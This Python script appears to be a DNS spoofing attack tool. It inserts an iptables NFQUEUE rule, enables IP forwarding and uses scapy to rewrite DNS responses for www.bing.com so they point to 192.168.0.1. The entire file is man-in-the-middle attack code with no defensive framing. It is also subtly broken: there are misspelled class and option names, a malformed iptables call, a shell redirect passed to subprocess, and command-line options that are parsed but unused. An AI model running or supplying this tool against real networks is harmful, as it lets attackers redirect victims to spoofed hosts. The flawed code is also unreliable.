#!/usr/bin/env python
import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy


def argument():
    a = optparse.OptionParser()
    a.add_option("-d", "--dns", dest="dns", help="[+] DNS hack.")
    a.add_option("-h", "--host_hack", dest="host_hack", help="[+] IP address DNS spoof.")
    (options, arguments) = a.parse_args()
    if not options.dns and not options.host_hack:
        a.error()
    else:
        return options


def process_packet(packet):
    ip_packet = scapy.IP(packet.get_payload())
    if ip_packet.haslayer(scapy.DNSRR):
        qname = ip_packet[scapy.DNSQR].qname
        if "www.bing.com" == qname:
            print("[+] Spoofing DNS target.")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
            ip_packet[scapy.DNS].an = answer
            ip_packet[scapy.DNS].ancount = 1
            del ip_packet[scapy.IP].len
            del ip_packet[scapy.IP].chksum
            del ip_packet[scapy.UDP].len
            del ip_packet[scapy.UDP].chksum
            packet.set_payload(str(ip_packet))
    packet.accept()


try:
    a = argument()
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE ", "--gueue-num 0"])
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    queue = netfilterqueue.NerfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except Exception:
    subprocess.call(["iptables", "-F"])
    print("[-] Detected CTRL + C ...... \n[+] Quitting .....")